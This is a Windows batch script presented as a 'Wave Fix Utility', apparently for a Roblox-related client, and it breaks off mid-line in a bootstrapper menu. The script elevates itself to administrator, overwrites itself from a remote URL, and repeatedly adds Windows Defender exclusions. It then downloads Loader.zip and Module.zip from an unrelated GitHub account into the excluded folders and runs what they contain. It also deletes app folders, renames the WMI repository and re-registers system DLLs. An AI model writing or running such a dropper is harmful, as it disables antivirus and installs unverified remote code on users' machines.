@echo off
setlocal EnableExtensions EnableDelayedExpansion
::  Wave Fix Utility. Warning Do not modify!
::  All rights reserved. Made by Zenix team
::
::  This utility provides automatic fixes for common Wave client issues
::  and ensures optimal system configuration for Roblox Wave.
set "CURRENT_VER=1.0.0"
set "RAW_VER=https://raw.githubusercontent.com/redyfoxsyr0/Fixwater/refs/heads/main/version.txt"
set "RAW_BAT=https://raw.githubusercontent.com/redyfoxsyr0/Fixwater/refs/heads/main/FixWave.bat"
for /f "delims=" %%D in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"') do set "DESKTOP=%%D"
set "NEWFILE=%DESKTOP%\WaveFixer.bat"
set "LATEST_VER="
for /f "usebackq delims=" %%V in (`
  powershell -NoProfile -Command ^
  "try { (Invoke-WebRequest -UseBasicParsing '%RAW_VER%').Content.Trim() } catch { '' }"
`) do set "LATEST_VER=%%V"
if not defined LATEST_VER goto :after_update
if "%LATEST_VER%"=="%CURRENT_VER%" goto :after_update
echo [UPDATE] %CURRENT_VER% -> %LATEST_VER%
echo [UPDATE] Downloading updated version...
powershell -NoProfile -Command ^
  "Invoke-WebRequest -UseBasicParsing '%RAW_BAT%' -OutFile '%NEWFILE%'"
if not exist "%NEWFILE%" (
    echo [UPDATE][FAIL] Connection issue detected
    pause
    goto :after_update
)

copy /y "%NEWFILE%" "%~f0" >nul
del "%DESKTOP%\version.txt" >nul 2>&1
del "%DESKTOP%\%LATEST_VER%" >nul 2>&1
del "%DESKTOP%\%CURRENT_VER%" >nul 2>&1
for /f "delims=" %%F in ('dir /b "%DESKTOP%" ^| findstr /R "^[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*$"') do (
    del "%DESKTOP%\%%F" >nul 2>&1
)

del "%DESKTOP%\version.txt" >nul 2>&1
echo [UPDATE] Update completed successfully.
echo [UPDATE] Restarting utility...
start "" "%~f0"
exit /b
:after_update

title WaveFix Utility - v1.0.0
color 0B
set "WINMAJOR="
for /f "usebackq delims=" %%V in (`powershell -NoProfile -Command ^
  "$v=[Environment]::OSVersion.Version.Major; if($v){$v}"`
) do set "WINMAJOR=%%V"
if defined WINMAJOR (
    for /f "delims=0123456789" %%Z in ("%WINMAJOR%") do set "WINMAJOR="
)
if defined WINMAJOR if %WINMAJOR% GEQ 10 (
    reg query "HKCU\Console" >nul 2>&1 || reg add "HKCU\Console" >nul
    reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1
)

set "SELF=%~f0"
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!] Administrator privileges required...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Start-Process -FilePath '%SELF%' -Verb RunAs -ArgumentList @('-elevated')"
    exit /b
)

if /I "%~1"=="-elevated" shift
set "TargetDir=C:\WaveSetup"
set "InstallerPath=%TargetDir%\Wave.exe"
set "WaveURL=https://getwave.gg/downloads/Wave.exe"

goto wave_main_menu

:CreateDesktopShortcut
set "SC_TARGET=%~1"
set "SC_NAME=%~2"
if not exist "%SC_TARGET%" (
    echo [Error] Target file not found: "%SC_TARGET%"
    pause
    goto :eof
)
for /f "delims=" %%D in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"') do set "DESK=%%D"
set "LNK=%DESK%\%SC_NAME%.lnk"
echo [*] Desktop path resolved: "%DESK%"
echo [*] Creating shortcut: "%LNK%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object -ComObject WScript.Shell; $s=$w.CreateShortcut('%LNK%'); $s.TargetPath='%SC_TARGET%'; $s.WorkingDirectory=(Split-Path '%SC_TARGET%'); $s.IconLocation='%SC_TARGET%,0'; $s.Save()"
if exist "%LNK%" (
    echo [Success] Shortcut created successfully!
) else (
    echo [Error] Shortcut creation failed
)
goto :eof

:wave_main_menu
cls
echo.
echo +==========================================================================+
echo ^|                      WAVE CLIENT FIX UTILITY                             ^|
echo ^|                    Diagnostic and Repair Toolkit                         ^|
echo ^|               All rights reserved.  Made by Zenix Team                   ^|
echo +==========================================================================+
echo ^| [1] Install Wave(deleting old files replacing with new)                  ^|
echo ^| [2] Module error/Failed to install module Fix                            ^|
echo ^| [3] Loader / Initialization Fix                                          ^|
echo ^| [4] Dependency Repair (Runtime Components)                               ^|
echo ^| [5] HWID Validation Repair                                               ^|
echo ^| [6] License Validation Fix                                               ^|
echo ^| [7] Network Optimization (WARP VPN)                                      ^|
echo ^| [8] Whitelist wave in windows defender                                   ^|
echo ^| [9] Bootstrapper Installation                                            ^|
echo +==========================================================================+
echo ^| [X] Exit Utility                                                         ^|
echo +==========================================================================+
echo.
set /p "MAINCHOICE=Select option: "
if /I "%MAINCHOICE%"=="1" goto wave_install
if /I "%MAINCHOICE%"=="2" goto Fix_Wave_Module
if /I "%MAINCHOICE%"=="3" goto Wave_Loader_Fix
if /I "%MAINCHOICE%"=="4" goto Repair_Runtimes
if /I "%MAINCHOICE%"=="5" goto Fix_HWID_Validation
if /I "%MAINCHOICE%"=="6" goto Time_Sync_DNS
if /I "%MAINCHOICE%"=="7" goto install_cf_warp
if /I "%MAINCHOICE%"=="8" goto Configure_Exclusions
if /I "%MAINCHOICE%"=="9" goto bootstrap_menu
if /I "%MAINCHOICE%"=="X" exit /b
echo Invalid selection. Please try again.
timeout /t 2 >nul
goto wave_main_menu

:wave_install
cls
echo +==========================================================================+
echo ^|                         WAVE CLIENT INSTALLATION                          ^|
echo +==========================================================================+
echo.
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!] Administrative rights required.
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -ArgumentList @('-elevated')"
    exit /b
)

set "WAVE_INSTALL=C:\WaveSetup"
set "WAVE_DIR=%LOCALAPPDATA%\Wave"
set "WAVE_WEBVIEW=%LOCALAPPDATA%\Wave.WebView2"
echo [+] Configuring Windows Defender exclusions...
echo     %WAVE_INSTALL%
echo     %WAVE_DIR%
echo     %WAVE_WEBVIEW%
echo.
powershell -NoProfile -Command ^
"Add-MpPreference -ExclusionPath '%WAVE_INSTALL%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_DIR%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_WEBVIEW%' -ErrorAction SilentlyContinue"

echo [+] Security exclusions configured.
echo.
echo [*] Preparing system environment...
taskkill /f /im "Wave.exe" >nul 2>&1
taskkill /f /im "Wave-Setup.exe" >nul 2>&1
taskkill /f /im "Bloxstrap.exe" >nul 2>&1
taskkill /f /im "Fishstrap.exe" >nul 2>&1
taskkill /f /im "Roblox.exe" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\Wave.WebView2" 2>nul
rmdir /s /q "%LOCALAPPDATA%\Wave" 2>nul
rmdir /s /q "%TargetDir%" 2>nul
rmdir /s /q "%LOCALAPPDATA%\Bloxstrap" 2>nul
rmdir /s /q "%LOCALAPPDATA%\Fishstrap" 2>nul
rmdir /s /q "%LOCALAPPDATA%\Roblox" 2>nul
echo [Success] System preparation complete.
if not exist "%TargetDir%" mkdir "%TargetDir%"
if not exist "%LOCALAPPDATA%\Wave" mkdir "%LOCALAPPDATA%\Wave"
if not exist "%LOCALAPPDATA%\Wave\Tabs" mkdir "%LOCALAPPDATA%\Wave\Tabs"
echo.
echo [*] Installing required components...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/9.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet9.exe'"
if exist "%TargetDir%\dotnet9.exe" start /wait "" "%TargetDir%\dotnet9.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/8.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet8.exe'"
if exist "%TargetDir%\dotnet8.exe" start /wait "" "%TargetDir%\dotnet8.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/6.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet6.exe'"
if exist "%TargetDir%\dotnet6.exe" start /wait "" "%TargetDir%\dotnet6.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x86.exe' -OutFile '%TargetDir%\vcx86.exe'"
if exist "%TargetDir%\vcx86.exe" start /wait "" "%TargetDir%\vcx86.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TargetDir%\vcx64.exe'"
if exist "%TargetDir%\vcx64.exe" start /wait "" "%TargetDir%\vcx64.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://download.visualstudio.microsoft.com/download/pr/b92958c6-ae36-4efa-aafe-569fced953a5/1654639ef3b20eb576174c1cc200f33a/windowsdesktop-runtime-3.1.32-win-x64.exe' -OutFile '%TargetDir%\dotnet3.1.32.exe'" >nul 2>&1
if exist "%TargetDir%\dotnet3.1.32.exe" (
    echo Installing .NET Framework 3.1.32...
    start /wait "" "%TargetDir%\dotnet3.1.32.exe" /install /quiet /norestart
)

powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v22.11.0/node-v22.11.0-x64.msi' -OutFile '%TargetDir%\node.msi'"
if exist "%TargetDir%\node.msi" start /wait msiexec /i "%TargetDir%\node.msi" /quiet /norestart
echo [Success] Components installed.
echo.
echo [*] Downloading Wave client...
powershell -NoProfile -Command "Invoke-WebRequest -Uri \"%WaveURL%\" -OutFile \"%InstallerPath%\""
if not exist "%InstallerPath%" (
    echo [Error] Download unsuccessful. Check network connection.
    pause
    goto wave_main_menu
)

echo [Success] Wave client downloaded.
echo.
echo [*] Creating desktop access shortcut...
call :CreateDesktopShortcut "%InstallerPath%" "Wave"
echo.
echo [*] Launching Wave client...
powershell -NoProfile -Command "Start-Process -FilePath \"%InstallerPath%\" -Verb RunAs"
echo [Success] Wave client launched!
timeout /t 4 >nul
echo.
echo +==========================================================================+
echo ^|                  SELECT BOOTSTRAPPER INSTALLATION                        ^|
echo +==========================================================================+
goto bootstrap_menu

:Configure_Exclusions
cls
set "WAVE_INSTALL=C:\WaveSetup"
set "WAVE_DIR=%LOCALAPPDATA%\Wave"
set "WAVE_WEBVIEW=%LOCALAPPDATA%\Wave.WebView2"
echo [+] Configuring Windows Defender exclusions...
echo     %WAVE_INSTALL%
echo     %WAVE_DIR%
echo     %WAVE_WEBVIEW%
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"try { ^
  Add-MpPreference -ExclusionPath '%WAVE_INSTALL%' -ErrorAction Stop; ^
  Add-MpPreference -ExclusionPath '%WAVE_DIR%' -ErrorAction Stop; ^
  Add-MpPreference -ExclusionPath '%WAVE_WEBVIEW%' -ErrorAction Stop; ^
  Write-Host '[OK] Exclusions configured.' ^
} catch { ^
  Write-Host '[FAIL]' $_.Exception.Message ^
  exit 1 ^
}"
if %errorlevel% neq 0 (
  echo.
  echo [!] Configuration unsuccessful.
  echo     - Defender components may be unavailable
  echo     - Tamper Protection may be active
  pause
  goto wave_main_menu
)

echo.
echo [+] Security exclusions successfully applied!
pause
goto wave_main_menu

:Fix_Wave_Module
cls
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!] Administrator privileges required, Waiting for user.
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -ArgumentList @('-elevated')"
    exit /b
)

set "WAVE_INSTALL=C:\WaveSetup"
set "WAVE_DIR=%LOCALAPPDATA%\Wave"
set "WAVE_WEBVIEW=%LOCALAPPDATA%\Wave.WebView2"
echo [+] Configuring security exclusions...
echo     %WAVE_INSTALL%
echo     %WAVE_DIR%
echo     %WAVE_WEBVIEW%
echo.
powershell -NoProfile -Command ^
"Add-MpPreference -ExclusionPath '%WAVE_INSTALL%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_DIR%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_WEBVIEW%' -ErrorAction SilentlyContinue"

echo [+] Succes whitelisted wave to windows defeneder.
echo.
echo [*] Resolving module issues...
echo.
set "MODULE_URL=https://github.com/s79zqwhnwx-byte/wave-fix/releases/download/ZIP/Module.zip"
set "ZIP_NAME=Wave_Module.zip"
set "DEST_DIR=%LOCALAPPDATA%"
set "WAVE_DIR=%DEST_DIR%\Wave"
set "WV2_DIR=%DEST_DIR%\Wave.WebView2"
echo [*] Target directory: "%DEST_DIR%"
echo.
echo [*] Stopping related processes...
taskkill /f /im Wave.exe >nul 2>&1
taskkill /f /im msedgewebview2.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
timeout /t 2 >nul
echo [*] Cleaning existing data...
if exist "%WAVE_DIR%" (
    echo     - Removing "%WAVE_DIR%"
    rmdir /s /q "%WAVE_DIR%"
)
if exist "%WV2_DIR%" (
    echo     - Removing "%WV2_DIR%"
    rmdir /s /q "%WV2_DIR%"
)
if exist "%WAVE_DIR%" (
    echo [ERROR] Unable to remove "%WAVE_DIR%"
    pause
    goto wave_main_menu
)
if exist "%WV2_DIR%" (
    echo [ERROR] Unable to remove "%WV2_DIR%"
    pause
    goto wave_main_menu
)

echo [*] Old files was succesful cleaned.
echo.
echo [*] Downloading module components...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%MODULE_URL%' -OutFile '%DEST_DIR%\%ZIP_NAME%'"

if not exist "%DEST_DIR%\%ZIP_NAME%" (
    echo [ERROR] Download unsuccessful.
    pause
    goto wave_main_menu
)

echo [*] Extracting components...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Expand-Archive -Force '%DEST_DIR%\%ZIP_NAME%' '%DEST_DIR%'"
del "%DEST_DIR%\%ZIP_NAME%" >nul 2>&1
echo.
echo [*] Module repair completed.
echo [*] Launching Wave client...
set "WAVE_EXE="
echo [*] Locating Wave installation...
set "WAVE_FOUND="

if exist "%USERPROFILE%\Desktop\wave.lnk" (
    echo     - Desktop shortcut located
    start "" "%USERPROFILE%\Desktop\wave.lnk"
    goto :LaunchComplete
)
for %%P in (
  "%USERPROFILE%\Desktop\wave.exe"
  "%USERPROFILE%\Downloads\wave.exe"
  "%LOCALAPPDATA%\wave\wave.exe"
  "%LOCALAPPDATA%\Wave\wave.exe"
  "C:\WaveSetup\Wave.exe"
) do (
  if exist "%%~P" (
    set "WAVE_FOUND=%%~P"
    goto :WaveLocated
  )
)

:WaveLocated
if defined WAVE_FOUND (
    echo     - Executable located: "%WAVE_FOUND%"
    start "" "%WAVE_FOUND%"
    goto :LaunchComplete
)

for %%S in (
  "%APPDATA%\Microsoft\Windows\Start Menu\Programs\wave.lnk"
  "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\wave.lnk"
) do (
  if exist "%%~S" (
    echo     - Start Menu shortcut located
    start "" "%%~S"
    goto :LaunchComplete
  )
)

echo [*] Scanning system for Wave installation...
for /f "delims=" %%F in ('where /r C:\ wave.exe 2^>nul') do (
    set "WAVE_FOUND=%%F"
    goto :WaveLocated2
)

:WaveLocated2
if defined WAVE_FOUND (
    echo     - System scan located: "%WAVE_FOUND%"
    start "" "%WAVE_FOUND%"
    goto :LaunchComplete
)

echo [INFO] Wave installation not detected.
echo        Place wave.exe in Desktop/Downloads/%%LOCALAPPDATA%%\wave, or install to C:\WaveSetup.
timeout /t 3 >nul
goto wave_main_menu

:Wave_Loader_Fix
cls
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo [!] Administrator privileges required.
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -ArgumentList @('-elevated')"
    exit /b
)

set "WAVE_INSTALL=C:\WaveSetup"
set "WAVE_DIR=%LOCALAPPDATA%\Wave"
set "WAVE_WEBVIEW=%LOCALAPPDATA%\Wave.WebView2"
echo [+] Configuring security exclusions...
echo     %WAVE_INSTALL%
echo     %WAVE_DIR%
echo     %WAVE_WEBVIEW%
echo.
powershell -NoProfile -Command ^
"Add-MpPreference -ExclusionPath '%WAVE_INSTALL%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_DIR%' -ErrorAction SilentlyContinue; ^
 Add-MpPreference -ExclusionPath '%WAVE_WEBVIEW%' -ErrorAction SilentlyContinue"
echo [+] Security exclusions applied.
echo.
echo [*] Resolving loader issues...
echo.
echo [*] Stopping related processes...
taskkill /f /im Wave.exe >nul 2>&1
taskkill /f /im msedgewebview2.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
timeout /t 2 >nul
set "WAVE_LOADER_DIR=%LOCALAPPDATA%\wave"
set "ZIP_URL=https://github.com/s79zqwhnwx-byte/wave-fix/releases/download/ZIP/Loader.zip"
set "ZIP_PATH=%TEMP%\Loader.zip"
if not exist "%WAVE_LOADER_DIR%" mkdir "%WAVE_LOADER_DIR%"
echo [*] Downloading loader components...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"try { ^
  Invoke-WebRequest -UseBasicParsing -Uri '%ZIP_URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop; ^
  exit 0 ^
} catch { ^
  Write-Host '[ERROR] Download issue:' $_.Exception.Message; ^
  exit 1 ^
}"

if errorlevel 1 (
    echo [ERROR] Download unsuccessful
    echo        Source:  %ZIP_URL%
    echo        Destination: %ZIP_PATH%
    pause
    goto wave_main_menu
)

if not exist "%ZIP_PATH%" (
    echo [ERROR] Download reported success but file missing
    echo        Path: %ZIP_PATH%
    pause
    goto wave_main_menu
)

for %%A in ("%ZIP_PATH%") do echo [*] Download size: %%~zA bytes
echo.
echo [*] Extracting loader components...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"try { ^
  Expand-Archive -Force '%ZIP_PATH%' '%WAVE_LOADER_DIR%' -ErrorAction Stop; ^
  exit 0 ^
} catch { ^
  Write-Host '[ERROR] Extraction issue:' $_.Exception.Message; ^
  exit 1 ^
}"

del "%ZIP_PATH%" >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Extraction unsuccessful
    pause
    goto wave_main_menu
)
set "FOUND_LOADER="
for /r "%WAVE_LOADER_DIR%" %%F in (Loader.exe) do (
    set "FOUND_LOADER=%%F"
    goto :LoaderLocated
)

:LoaderLocated
if defined FOUND_LOADER (
    echo [+] Loader installed: "%FOUND_LOADER%"
) else (
    echo [ERROR] Loader.exe not located after extraction
    echo [*] Files containing "loader" under "%WAVE_LOADER_DIR%":
    dir /s /b "%WAVE_LOADER_DIR%" | findstr /i "loader"
    pause
    goto wave_main_menu
)

echo.
echo [*] Locating Wave installation...

set "WAVE_FOUND="
if exist "%USERPROFILE%\Desktop\wave.lnk" (
    echo     - Desktop shortcut located
    start "" "%USERPROFILE%\Desktop\wave.lnk"
    goto :LaunchComplete
)
for %%P in (
  "%USERPROFILE%\Desktop\wave.exe"
  "%USERPROFILE%\Downloads\wave.exe"
  "%LOCALAPPDATA%\wave\wave.exe"
  "%LOCALAPPDATA%\Wave\wave.exe"
  "C:\WaveSetup\Wave.exe"
) do (
  if exist "%%~P" (
    set "WAVE_FOUND=%%~P"
    goto :WaveLocated
  )
)

:WaveLocated
if defined WAVE_FOUND (
    echo     - Executable located: "%WAVE_FOUND%"
    start "" "%WAVE_FOUND%"
    goto :LaunchComplete
)

for %%S in (
  "%APPDATA%\Microsoft\Windows\Start Menu\Programs\wave.lnk"
  "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\wave.lnk"
) do (
  if exist "%%~S" (
    echo     - Start Menu shortcut located
    start "" "%%~S"
    goto :LaunchComplete
  )
)

echo [*] Scanning system for Wave installation...
for /f "delims=" %%F in ('where /r C:\ wave.exe 2^>nul') do (
    set "WAVE_FOUND=%%F"
    goto :WaveLocated2
)

:WaveLocated2
if defined WAVE_FOUND (
    echo     - System scan located: "%WAVE_FOUND%"
    start "" "%WAVE_FOUND%"
    goto :LaunchComplete
)

echo [INFO] Wave installation not detected.
echo        Place wave.exe in Desktop/Downloads/%%LOCALAPPDATA%%\wave, or install to C:\WaveSetup.
timeout /t 3 >nul
goto wave_main_menu

:install_cf_warp
cls
echo +==========================================================================+
echo ^|                 NETWORK OPTIMIZATION (WARP VPN)                           ^|
echo +==========================================================================+
echo.
if not exist "%TargetDir%" mkdir "%TargetDir%"
echo [*] Downloading components...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi' -OutFile '%TargetDir%\warp.msi'"
if not exist "%TargetDir%\warp.msi" (
    echo [Error] Download unsuccessful.
    pause
    goto wave_main_menu
)
echo [*] Installing components...
start /wait msiexec /i "%TargetDir%\warp.msi" /quiet /norestart
set "WarpCliPath=%ProgramFiles%\Cloudflare\Cloudflare WARP\warp-cli.exe"
if exist "%WarpCliPath%" (
    "%WarpCliPath%" registration new >nul
    "%WarpCliPath%" mode warp >nul
    "%WarpCliPath%" connect >nul
    echo [Success] WARP connection established!
) else (
    echo [Error] Installation completed but CLI not found
)
pause
goto wave_main_menu

:Time_Sync_DNS
cls
color 0B
echo ==========================================
echo   System Time and DNS Validation
echo ==========================================
echo.
echo [1/3] Configuring Windows Time service...
sc config w32time start= auto >nul 2>&1
net start w32time >nul 2>&1

echo [2/3] Synchronizing system time...
w32tm /resync /force >nul 2>&1
powershell -NoProfile -Command "Set-Date (Get-Date)" >nul 2>&1
echo [+] Time synchronization completed.
echo.
echo [3/3] Refreshing DNS cache...
ipconfig /flushdns
echo.
echo ==========================================
echo   Validation complete.
echo   System restart recommended if issues persist.
echo ==========================================
echo.
pause
goto wave_main_menu

:Fix_HWID_Validation
cls
set "NEED_REBOOT=0"
echo ==========================================
echo   HWID Validation Repair Utility
echo ==========================================
echo.
echo [1] Validating HWID via system query...
powershell -NoProfile -Command ^
"$u=(Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID; ^
 if($u){Write-Host '[OK] System UUID:' $u; exit 0} else {exit 1}"
IF %ERRORLEVEL% EQU 0 (
    echo.
    echo [*] HWID validation successful. No repair needed.
    pause
    goto wave_main_menu
)

echo [!] HWID validation failed. Initiating repair...
echo.
echo [2] Verifying WMI repository integrity...
winmgmt /verifyrepository | find /I "inconsistent" >nul
IF %ERRORLEVEL% EQU 0 (
    echo [!] Repository inconsistency detected. Repairing...
    winmgmt /salvagerepository
    set "NEED_REBOOT=1"
) ELSE (
    echo [OK] Repository integrity confirmed.
)

echo.
echo [3] Re-validating HWID after repair...
powershell -NoProfile -Command ^
"$u=(Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID; ^
 if($u){Write-Host '[OK] System UUID:' $u; exit 0} else {exit 1}"
IF %ERRORLEVEL% EQU 0 (
    echo.
    echo [*] Validation repaired successfully.
    echo.
    if "%NEED_REBOOT%"=="1" (
        echo [!] System restart recommended for complete repair.
        choice /C YN /N /M "Restart now? (Y/N): "
        if errorlevel 2 goto wave_main_menu
        shutdown /r /t 5 /c "HWID Repair - Completing system configuration"
        exit /b
    ) else (
        pause
        goto wave_main_menu
    )
)
echo.
echo [4] Rebuilding WMI repository...
set "NEED_REBOOT=1"
net stop winmgmt /y >nul 2>&1
if exist "%windir%\System32\wbem\Repository" (
    ren "%windir%\System32\wbem\Repository" Repository.old_%RANDOM%
)
net start winmgmt >nul 2>&1
echo.
echo [5] Repairing system components...
DISM /Online /Cleanup-Image /RestoreHealth
sfc /scannow
echo.
echo [6] Re-registering system components...
cd /d %windir%\System32\wbem
for %%i in (*.dll) do regsvr32 /s %%i
for %%i in (*.mof *.mfl) do mofcomp %%i
echo.
echo ==========================================
echo   Repair process completed.
echo   System restart required for finalization.
echo ==========================================
echo.
choice /C YN /N /M "Restart now? (Y/N): "
if errorlevel 2 goto wave_main_menu
shutdown /r /t 5 /c "HWID Repair - Finalizing system configuration"
exit /b

:Repair_Runtimes
cls
echo +==========================================================================+
echo ^|                     COMPONENT REPAIR UTILITY                              ^|
echo +==========================================================================+
echo.
if not exist "%TargetDir%" mkdir "%TargetDir%"
echo [*] Removing configuration conflicts...
set "FOUND=0"
reg query "HKCU\Environment" /v NODE_OPTIONS >nul 2>&1
if %errorlevel%==0 (
    reg delete "HKCU\Environment" /F /V NODE_OPTIONS >nul
    echo [+] User environment cleaned
    set "FOUND=1"
)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v NODE_OPTIONS >nul 2>&1
if %errorlevel%==0 (
    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /F /V NODE_OPTIONS >nul
    echo [+] System environment cleaned
    set "FOUND=1"
)
if %FOUND%==0 echo [!] No conflicts detected
echo.
echo [*] Reinstalling required components...
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/9.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet9.exe'"
if exist "%TargetDir%\dotnet9.exe" start /wait "" "%TargetDir%\dotnet9.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/8.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet8.exe'"
if exist "%TargetDir%\dotnet8.exe" start /wait "" "%TargetDir%\dotnet8.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/dotnet/6.0/windowsdesktop-runtime-win-x64.exe' -OutFile '%TargetDir%\dotnet6.exe'"
if exist "%TargetDir%\dotnet6.exe" start /wait "" "%TargetDir%\dotnet6.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x86.exe' -OutFile '%TargetDir%\vcx86.exe'"
if exist "%TargetDir%\vcx86.exe" start /wait "" "%TargetDir%\vcx86.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TargetDir%\vcx64.exe'"
if exist "%TargetDir%\vcx64.exe" start /wait "" "%TargetDir%\vcx64.exe" /install /quiet /norestart
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://download.visualstudio.microsoft.com/download/pr/b92958c6-ae36-4efa-aafe-569fced953a5/1654639ef3b20eb576174c1cc200f33a/windowsdesktop-runtime-3.1.32-win-x64.exe' -OutFile '%TargetDir%\dotnet3.1.32.exe'" >nul 2>&1
if exist "%TargetDir%\dotnet3.1.32.exe" (
    echo Installing .NET Framework 3.1.32...
    start /wait "" "%TargetDir%\dotnet3.1.32.exe" /install /quiet /norestart
)
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v22.11.0/node-v22.11.0-x64.msi' -OutFile '%TargetDir%\node.msi'"
if exist "%TargetDir%\node.msi" start /wait msiexec /i "%TargetDir%\node.msi" /quiet /norestart
echo [Success] Component repair completed.
pause
goto wave_main_menu

:bootstrap_menu
cls
echo +==========================================================================+
echo ^|                     BOOTSTRAPPER INSTALLATION MENU                        ^|
echo +==========================================================================+
echo.
echo [1] Bloxstrap v2.9.1 (recommended)
echo [2] Fishstrap v2.9.1.2 (FPS optimization)
echo [3] MTX-Bloxstrap-Installer-2.9.0 (advanced)
echo [B] Return to main menu
echo.
set /p "CHOICE=Selection: "
set "BOOT_NAME="
set "BOOT_URL="
if /I "%CHOICE%"=="1" (
    set